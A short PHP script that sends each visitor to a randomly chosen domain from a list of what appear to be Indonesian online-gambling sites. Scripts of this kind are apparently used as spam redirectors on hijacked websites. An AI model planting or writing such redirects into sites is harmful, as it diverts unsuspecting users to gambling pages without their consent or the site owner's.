<?php
// Array of URLs to redirect to
$urls = [
    'https://sateslotgacor.info',
    'https://nasgorbetgacor.xyz',
    'https://nagaforwingacor.store',
    'https://megaforwinbet.store',
    'https://bimatoto.vip',
    'https://buditogeljitu.store',
    // Add more URLs here
];

// Pick a random URL from the array
$random_url = $urls[array_rand($urls)];

// Redirect to the selected URL
header("Location: $random_url");
exit();
?>
